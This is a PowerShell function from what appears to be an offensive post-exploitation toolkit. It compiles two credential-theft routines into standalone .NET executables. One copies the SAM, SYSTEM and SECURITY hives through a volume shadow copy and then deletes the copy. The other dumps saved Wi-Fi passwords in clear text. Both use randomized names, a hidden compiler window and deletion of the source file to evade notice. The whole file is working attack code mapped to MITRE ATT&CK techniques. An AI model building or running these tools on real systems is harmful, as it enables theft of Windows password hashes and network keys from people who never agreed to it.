function Invoke-Compile {
<# 

.SYNOPSIS

	Compiles some of Apex's functionality to .NET Assemblies.

.EXAMPLE 
	
	Compile:
	PS> Invoke-Compile -CopySAM
	
	Execute:
	C:\CopySAM.exe

.NOTES

	Author: Fabrizio Siciliano (@0rbz_)

#>

[CmdletBinding()]
param (
	[Parameter(Position=1)]
	[Switch]$Help,
	[Switch]$List,
		
	[Parameter(Mandatory = $False)]
	[Switch]$CopySAM,
	
	[Parameter(Mandatory = $False)]
	[Switch]$WiFiCreds

)

$X = (-join ((65..90) + (97..122) | Get-Random -Count 11 | foreach {[char]$_}))
$Z = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))
$FWDir = $([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())
$SmaDll = [PSObject].Assembly.Location
$CsFile = "$env:temp\$Z.cs"
$Compiler = "$FWDir" + "c?c.??e"


	if ($Help -eq $True) {
		Write @"

 ### Invoke-Compile Help ###
 ---------------------------
 Available Invoke-Compile Commands:
 ----------------------------------
 
 |---------------------------------------------------------------------|
 | -CopySAM                                                            |
 |---------------------------------------------------------------------| 

   [*] Description: Invoke-Creds -CopySAM functionality compiled as a
       .NET Assembly.
	
       Tested on Win 10 / .NET CLRVersion 4.0.30319.42000
	
       The resulting CopySAM.exe assembly requires admin rights to work.

   [*] Usage: Invoke-Compile -CopySam
   
   [*] Mitre ATT&CK Ref: T1003 (Credential Dumping)

 |---------------------------------------------------------------------|
 | -WiFiCreds                                                          |
 |---------------------------------------------------------------------|

   [*] Description: Invoke-Creds -WifiCreds functionality compiled as a
       .NET Assembly.
	   
       Tested on Win 10 / .NET CLRVersion 4.0.30319.42000

   [*] Usage: Invoke-Compile -WiFiCreds
   
   [*] Mitre ATT&CK Ref: T1081 (Credentials in Files)
   
 \---------------------------------------------------------------------/
   
"@
	}
	elseif ($List -eq $True) {
		Write @"  

 Invoke-Compile Brief Command Usage:
 -----------------------------------
 Invoke-Compile -CopySAM
 Invoke-Compile -WiFiCreds

"@
	}
	elseif ($CopySAM) {
		
		$CompilerArgs = "/r:$SmaDll /t:exe /out:$env:temp\CopySAM.exe $CsFile"
		
		$Source = @"
using System.Collections.ObjectModel;
using System.Management.Automation;
using System;
using System.IO;

namespace $Z
{
    class $Z
    {
        static void Main(string[] args)
        {
            using (PowerShell $X = PowerShell.Create().AddScript(@"
`$class = [WMICLASS]'root\cimv2:win32_shadowcopy'
`$class.create('C:\', 'ClientAccessible')
`$DeviceObjectName = (Get-WmiObject win32_shadowcopy | select -ExpandProperty DeviceObject -Last 1)
`$ShadowCopyID = (Get-WmiObject win32_shadowcopy | select -ExpandProperty ID | select -Last 1)
(C:\\windows\\system32\\cmd.exe /c copy `$DeviceObjectName\windows\system32\config\SYSTEM `$env:temp\SYSTEM)
(C:\\windows\\system32\\cmd.exe /c copy `$DeviceObjectName\windows\system32\config\SECURITY `$env:temp\SECURITY)
(C:\\windows\\system32\\cmd.exe /c copy `$DeviceObjectName\windows\system32\config\SAM `$env:temp\SAM)
(C:\\windows\\system32\\vssadmin.exe delete shadows /Shadow=`$ShadowCopyID /quiet)"))
            {
                Collection<PSObject> Output = $X.Invoke();
            }
			Environment.CurrentDirectory = Environment.GetEnvironmentVariable("temp");
			DirectoryInfo dir = new DirectoryInfo(".");
			Console.WriteLine("[+] SYSTEM, SAM and SECURITY files saved to " + dir.FullName);
        }
    }
}
"@
	
		New-Item "$env:temp\$Z.cs" -ItemType File >$null 2>&1
		Add-Content $CsFile $Source
		Start-Process -Wi Hidden -FilePath $Compiler -ArgumentList $CompilerArgs
		Sleep 4
		Remove-Item $env:temp\$Z.cs
		Write "`n [+] Assembly --> $env:temp\CopySAM.exe`n"
	}
	elseif ($WiFiCreds) {
		
		$CompilerArgs = "/r:$SmaDll /t:exe /out:$env:temp\WiFiCreds.exe $CsFile"

		$Source = @"
using System.Collections.ObjectModel;
using System.Management.Automation;
using System;
using System.IO;

namespace $Z
{
    class $Z
    {
        static void Main(string[] args)
        {
            using (PowerShell $X = PowerShell.Create().AddScript(@"
(C:\windows\system32\netsh.exe wlan show profiles) | Select-String ""\:(.+)`$"" | %{`$name=`$_.Matches.Groups[1].Value.Trim(); `$_} | %{(netsh wlan show profile name=""`$name"" key=clear)} | Select-String ""Key Content\W+\:(.+)`$"" | %{`$pass=`$_.Matches.Groups[1].Value.Trim(); `$_} | %{[PSCustomObject]@{ ""Wireless Profile""=`$name;""Password""=`$pass }} | Format-Table -AutoSize | Out-File C:\\temp\\$Z"))
            {
                Collection<PSObject> Output = $X.Invoke();
            }
		// Console.WriteLine("WiFi Credentials save to C:\\temp\\$Z");
		string text = System.IO.File.ReadAllText(@"C:\\temp\\$Z");
		System.Console.WriteLine("{0}", text);
		// System.Console.ReadLine();
		System.IO.File.Delete("C:\\temp\\$Z");
        }
    }
}
"@

		New-Item "$env:temp\$Z.cs" -ItemType File >$null 2>&1
		Add-Content $CsFile $Source
		Start-Process -Wi Hidden -FilePath $Compiler -ArgumentList $CompilerArgs
		Sleep 4
		Remove-Item $env:temp\$Z.cs
		Write "`n [+] Assembly --> $env:temp\WiFiCreds.exe`n"
	}
}